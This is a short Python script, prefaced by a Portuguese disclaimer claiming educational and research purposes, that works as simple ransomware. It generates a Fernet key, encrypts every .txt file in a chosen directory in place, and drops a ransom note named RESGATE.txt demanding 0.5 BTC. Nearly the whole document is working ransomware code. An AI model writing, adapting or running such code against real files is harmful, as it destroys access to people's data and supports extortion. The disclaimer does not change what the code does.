"""
--------------------------------------------------------------------------------
AVISO LEGAL E USO ÉTICO
--------------------------------------------------------------------------------
Este script foi desenvolvido estritamente para fins EDUCACIONAIS e de PESQUISA 
em segurança cibernética. O objetivo é demonstrar o funcionamento técnico de 
ameaças para auxiliar na criação de medidas de defesa e conscientização.

O autor não se responsabiliza pelo uso indevido, ilegal ou danos causados por 
este código. O uso deste software contra sistemas sem autorização prévia e 
expressa é ILEGAL e punível por lei.

Sempre execute este código em ambientes isolados (Máquinas Virtuais ou Sandboxes).
--------------------------------------------------------------------------------
"""
from cryptography.fernet import Fernet
import os

# 1. Gerar e salvar a chave
def generate_key():
    key = Fernet.generate_key()
    with open("secret.key", "wb") as key_file:
        key_file.write(key)

# 2. Carregar a chave
def load_key():
    return open("secret.key", "rb").read()

# 3. Criptografar arquivos em um diretório de teste
def encrypt_files(directory):
    key = load_key()
    f = Fernet(key)
    for file in os.listdir(directory):
        if file.endswith(".txt"): # Alvo apenas arquivos de texto para teste
            with open(f"{directory}/{file}", "rb") as file_to_encrypt:
                data = file_to_encrypt.read()
            encrypted_data = f.encrypt(data)
            with open(f"{directory}/{file}", "wb") as encrypted_file:
                encrypted_file.write(encrypted_data)
    
    with open(f"{directory}/RESGATE.txt", "w") as ransom_note:
        ransom_note.write("Seus arquivos foram criptografados! Pague 0.5 BTC para recuperar.")